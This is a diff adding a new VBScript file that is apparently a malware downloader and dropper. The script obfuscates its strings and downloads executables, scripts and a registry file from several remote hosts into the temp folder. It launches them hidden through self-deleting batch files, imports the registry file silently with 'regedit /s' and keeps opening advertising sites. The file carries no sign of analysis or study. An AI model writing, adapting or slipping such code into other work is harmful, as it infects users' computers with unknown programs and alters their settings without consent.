@@ -1,0 +1,92 @@
+on error resume next
+a6157328="http://p3.ch"&"ina.sog"&"ou.google.baid"&"u.com.ba"&"idu163s"&"o.info"
+d82fwthu="http://98.126.249.6:81"
+fe589b11="http://222.217.240.30"
+Set b25o1nis= WScript.CreateObject("WScr"&"ipt.Sh"&"ell") 
+Set m1p70o3me = Wscript.CreateObject("Script"&"ing.FileSystemO"&"bject") 
+cfyvh66e=b25o1nis.ExpandEnvironmentStrings("%temp%")
+w0m4e700 = left(cfyvh66e,3)
+b25o1nis.Run("htt"&"p://w"&"ww.xs"&"p5.i"&"nfo/index3.htm")
+b25o1nis.run "C:\Progra~1\Intern~1\IEXPLORE.EXE http://ww"&"w.xs"&"p5.info/index/index3.htm",0 
+
+Sub c19zmyg66(t11uked0l)
+Set el2cixct= CreateObject("scrip"&"ting.Fi"&"leSys"&"temObject") 
+If Not el2cixct.FolderExists(t11uked0l) Then
+  el2cixct.CreateFolder t11uked0l
+End If
+Set el2cixct = Nothing 
+end sub
+
+Call c19zmyg66(w0m4e700&"Prog"&"ra~1\Win"&"RAR\ico")
+ico1=w0m4e700&"Prog"&"ra~1\WinR"&"AR\ico\"
+
+Sub gf772do2(q1k37fx5y,w15x1q977)
+Set j11a41q13 = CreateObject("M"&"icros"&"oft.XM"&"L"&"HT"&"TP")
+Set k1v3wutu0 = CreateObject("AD"&"O"&"DB.S"&"t"&"r"&"e"&"a"&"m")
+with j11a41q13
+.Open "GET",q1k37fx5y,0
+.Send()
+end with
+b=j11a41q13.responseBody
+with k1v3wutu0
+.type = eval("1")
+.Mode = eval("3")
+.open()
+.write eval("j11a41q13.r"&"es"&"po"&"n"&"se"&"Bo"&"d"&"y")
+.SaveToFile w15x1q977,eval ("2")
+end with
+k1v3wutu0.close
+end sub
+
+Sub d1i7z30yl(e112of1ii,f17t2qhx3)
+Set r126f15v9 = CreateObject("Script"&"ing.FileSyste"&"mObject")
+If r126f15v9.FileExists(e112of1ii) Then                         
+       r126f15v9.deletefile(e112of1ii)
+End If
+    Set g16fe6j7b=r126f15v9.CreateTextFile(e112of1ii,False)
+    g16fe6j7b.WriteLine(f17t2qhx3)
+    g16fe6j7b.WriteLine("de"&"l %"&"0 ")
+    g16fe6j7b.Close       
+Set r126f15v9  = Nothing
+end sub
+
+call gf772do2(a6157328&"/ico/tb.ico",ico1&"tb.ico")
+for i=1 to 6
+call gf772do2(a6157328&"/ico/"+cstr(i)+".ico",w0m4e700&"Progra~1\WinRAR\ico\"+cstr(i)+".ico")
+next
+
+call gf772do2(d82fwthu&"/"&"hao.txt",cfyvh66e&"\xin"&"g.vbs")
+ry88a2el=cfyvh66e&"\xingxi"&"ng.bat"
+call  d1i7z30yl(ry88a2el,"start %Temp%\xi"&"ng.vbs")
+cmd=b25o1nis.RUN(ry88a2el, runhide)
+b25o1nis.Run "http://www.19885.info/?gg"
+
+call gf772do2(a6157328&"/go/page.txt",cfyvh66e&"\page.vbs")
+ry88a2el=cfyvh66e&"\pagepage.bat"
+call  d1i7z30yl(ry88a2el,"start %Temp%\page.vbs")
+cmd=b25o1nis.RUN(ry88a2el, runhide)
+b25o1nis.Run "http://www.19887.info/?gg"
+
+call gf772do2(a6157328&"/dy/aa.html",cfyvh66e&"\aa.exe")
+call d1i7z30yl(cfyvh66e&"\dian.bat","start %Temp%\aa.exe")
+cmd=b25o1nis.RUN(cfyvh66e&"\dian.bat", runhide)
+b25o1nis.Run "h"&"ttp://www.198"&"56.info/?gg"
+
+call gf772do2(fe589b11&"/soft/uaua4397.exe",cfyvh66e&"\uaua4397.exe")
+ry88a2el=cfyvh66e&"\ua2.bat"
+call  d1i7z30yl(ry88a2el,"start %Temp%\uaua4397.exe")
+cmd=b25o1nis.RUN(ry88a2el, runhide)
+
+call gf772do2(fe589b11&"/soft/gua"&"gua4397.exe",cfyvh66e&"\guagua4397.exe")
+ry88a2el=cfyvh66e&"\guagua.bat"
+call  d1i7z30yl(ry88a2el,"start %Temp%\guagua4397.exe")
+cmd=b25o1nis.RUN(ry88a2el, runhide)
+b25o1nis.Run "ht"&"tp://www.198"&"59.info/?gg"
+
+ry88a2el=cfyvh66e&"\ie.reg"
+call gf772do2(a6157328&"/go/ie.txt",ry88a2el)
+b25o1nis.Run "regedit /s "&ry88a2el
+b25o1nis.Run "htt"&"p://www.19"&"858.in"&"fo/?gg"
+
+call gf772do2(a6157328&"/go/goto.txt",cfyvh66e&"\goto.vbs")
+b25o1nis.Run cfyvh66e&"\goto.vbs",,True
